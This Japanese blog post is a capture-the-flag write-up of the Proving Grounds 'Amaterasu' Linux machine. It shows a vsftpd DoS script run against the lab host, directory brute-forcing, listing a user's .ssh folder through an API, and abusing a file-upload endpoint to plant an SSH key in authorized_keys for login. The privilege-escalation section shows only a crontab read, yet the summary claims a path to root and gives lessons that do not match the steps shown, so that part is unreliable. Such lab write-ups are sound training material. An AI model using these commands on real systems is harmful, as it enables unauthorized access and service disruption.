---
title: "Proving Grounds - Amaterasu (Linux)"
date: 2026-02-25
description: "Proving Grounds Amaterasu Linux マシン解説。偵察・初期アクセス・権限昇格を解説。"
categories: [Proving Grounds, Linux]
tags: [rce, suid, php, privilege-escalation]
mermaid: true
content_lang: ja
alt_en: /posts/pg-amaterasu/
---

## 概要

| 項目 | 内容 |
|---------------------------|-------|
| OS | Linux |
| 難易度 | 記録なし |
| 攻撃対象 | Webアプリケーションおよび公開されているネットワークサービス |
| 主な侵入経路 | Webを経由した初期アクセス |
| 権限昇格経路 | ローカル列挙 → 設定ミスの悪用 → root |

## 認証情報

認証情報なし。

## 偵察

---
💡 なぜ有効か
このフェーズでは到達可能な攻撃対象領域をマッピングし、悪用が最も成功しやすい箇所を特定します。正確なサービスおよびコンテンツ探索により、闇雲なテストを減らし、標的を絞った後続アクションに繋げます。

## 初期足がかり

---
攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
python2 49719.py 192.168.155.249
```

```bash
❌[22:38][CPU:1][MEM:53][TUN0:192.168.45.168][...me/n0z0/work/pg/Amaterasu]
🐉 > python2 49719.py 192.168.155.249

._________________.
|     VS-FTPD     |
|      D o S      |
|_________________|
|By XYN/DUMP/NSKB3|
|_|_____________|_|
|_|_|_|_____|_|_|_|
|_|_|_|_|_|_|_|_|_|


[!] Testing if 192.168.155.249:21 is open
[+] Port 21 open, starting attack...
[+] Attack started on 192.168.155.249:21!

```

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 50 -r --timeout 3 --no-state -s 200,301 -e -E -u http://$ip:33414
```

```bash
 
❌[22:09][CPU:5][MEM:51][TUN0:192.168.45.168][/home/n0z0]
🐉 > feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 50 -r --timeout 3 --no-state -s 200,301 -e -E -u http://$ip:33414
                                                                                                                                                                        
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.12.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.155.249:33414
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
 👌  Status Codes          │ [200, 301]
 💥  Timeout (secs)        │ 3
 🦡  User-Agent            │ feroxbuster/2.12.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💰  Collect Extensions    │ true
 💸  Ignored Extensions    │ [Images, Movies, Audio, etc...]
 🏁  HTTP methods          │ [GET]
 📍  Follow Redirects      │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        1l       19w      137c http://192.168.155.249:33414/help
200      GET        1l       14w       98c http://192.168.155.249:33414/info
```

![Screenshot from the amaterasu engagement](/assets/img/pg/amaterasu/Pasted%20image%2020251206234904.png)
*キャプション：このフェーズで取得したスクリーンショット*

![Screenshot from the amaterasu engagement](/assets/img/pg/amaterasu/Pasted%20image%2020251206234927.png)
*キャプション：このフェーズで取得したスクリーンショット*

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
curl -F file=@test.txt http://$ip:33414/file-upload
```

```bash
✅[23:53][CPU:36][MEM:55][TUN0:192.168.45.168][...me/n0z0/work/pg/Amaterasu]
🐉 > curl -F file=@test.txt http://$ip:33414/file-upload
{"message":"No filename part in the request"}

```

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
curl http://192.168.155.249:33414/file-list?dir=/home/alfredo/.ssh/
curl http://192.168.155.249:33414/file-list?dir=/home/alfredo/.ssh/id_rsa/
```

```bash
✅[23:58][CPU:40][MEM:51][TUN0:192.168.45.168][/home/n0z0]
🐉 > curl http://192.168.155.249:33414/file-list?dir=/home/alfredo/.ssh/          
["id_rsa","id_rsa.pub","up.txt"]
                                                                                                                                                                       
✅[23:59][CPU:24][MEM:53][TUN0:192.168.45.168][/home/n0z0]
🐉 > curl http://192.168.155.249:33414/file-list?dir=/home/alfredo/.ssh/id_rsa/   
<!doctype html>
<html lang=en>
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
                                                                                                                                                                       
✅[23:59][CPU:30][MEM:53][TUN0:192.168.45.168][/home/n0z0]

```

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
curl -F filename="/home/alfredo/.ssh/up.txt" -F file=@test.txt http://$ip:33414/file-upload
```

```bash
✅[23:59][CPU:74][MEM:53][TUN0:192.168.45.168][...me/n0z0/work/pg/Amaterasu]
🐉 > curl -F filename="/home/alfredo/.ssh/up.txt" -F file=@test.txt http://$ip:33414/file-upload
{"message":"File successfully uploaded"}

```

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
curl -F filename="/home/alfredo/.ssh/authorized_keys" -F file=@id_alfredo.pub http://$ip:33414/file-upload
curl -F filename="/home/alfredo/.ssh/authorized_keys" -F file=@id_alfredo.txt http://$ip:33414/file-upload
```

```bash
✅[0:02][CPU:40][MEM:55][TUN0:192.168.45.168][...me/n0z0/work/pg/Amaterasu]
🐉 > curl -F filename="/home/alfredo/.ssh/authorized_keys" -F file=@id_alfredo.pub http://$ip:33414/file-upload
{"message":"Allowed file types are txt, pdf, png, jpg, jpeg, gif"}

✅[0:03][CPU:50][MEM:57][TUN0:192.168.45.168][...me/n0z0/work/pg/Amaterasu]
🐉 > curl -F filename="/home/alfredo/.ssh/authorized_keys" -F file=@id_alfredo.txt http://$ip:33414/file-upload
{"message":"File successfully uploaded"}

```

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
ssh -p 25022 -i id_alfredo alfredo@$ip
```

```bash
❌[0:03][CPU:37][MEM:55][TUN0:192.168.45.168][...me/n0z0/work/pg/Amaterasu]
🐉 > ssh -p 25022 -i id_alfredo alfredo@$ip
Last failed login: Sat Dec  6 10:04:00 EST 2025 from 192.168.45.168 on ssh:notty
There were 16061 failed login attempts since the last successful login.
Last login: Tue Mar 28 03:21:25 2023
[alfredo@fedora ~]$ 
```

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
cat local.txt
```

```bash
[alfredo@fedora ~]$ cat local.txt 
557075abe60050ce63aa2838042b629a

```

💡 なぜ有効か
初期足がかりのステップでは、発見した脆弱性を連鎖させてターゲットを実行制御下に置きます。成功した足がかり技法は、コマンド実行またはインタラクティブシェルの取得によって検証されます。

## 権限昇格

---
攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
cat /etc/crontab
```

```bash
[alfredo@fedora tmp]$ cat /etc/crontab 
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root


```

💡 なぜ有効か
権限昇格は、ローカルの設定ミス・安全でないパーミッション・信頼された実行パスを利用します。これらの信頼境界を列挙して悪用することが、rootレベルのアクセスへの最短経路です。

## まとめ・学んだこと

- 本番同等の環境でフレームワークのデバッグモードとエラー露出を検証する。
- 特権ユーザーやスケジューラーが実行するスクリプト・バイナリのファイルパーミッションを制限する。
- ワイルドカード展開やスクリプト化可能な特権ツールを避けるため sudo ポリシーを強化する。
- 露出した認証情報と環境ファイルを重要機密として扱う。

## 参考文献

- RustScan: https://github.com/RustScan/RustScan
- Nmap: https://nmap.org/
- feroxbuster: https://github.com/epi052/feroxbuster
- Nuclei: https://github.com/projectdiscovery/nuclei
- GTFOBins: https://gtfobins.org/
- HackTricks Privilege Escalation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
